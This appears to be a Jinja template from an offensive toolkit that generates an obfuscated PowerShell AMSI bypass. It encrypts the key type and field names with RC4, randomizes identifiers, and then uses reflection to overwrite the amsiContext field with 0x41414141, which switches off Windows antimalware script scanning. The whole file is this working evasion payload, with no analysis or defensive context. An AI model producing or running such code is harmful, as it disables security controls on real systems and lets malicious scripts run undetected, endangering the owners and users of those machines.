{% set strings = [
    'System.Management.Automation.AmsiUtils',
    'amsiContext',
    'NonPublic,Static'
] %}

{% for s in strings %}
    ${{symbol_name("ref2")}}string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
{% endfor %}

[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(${{symbol_name("ref2")}}string1).GetField(${{symbol_name("ref2")}}string2,[Reflection.BindingFlags]${{symbol_name("ref2")}}string3).GetValue($null),0x41414141)
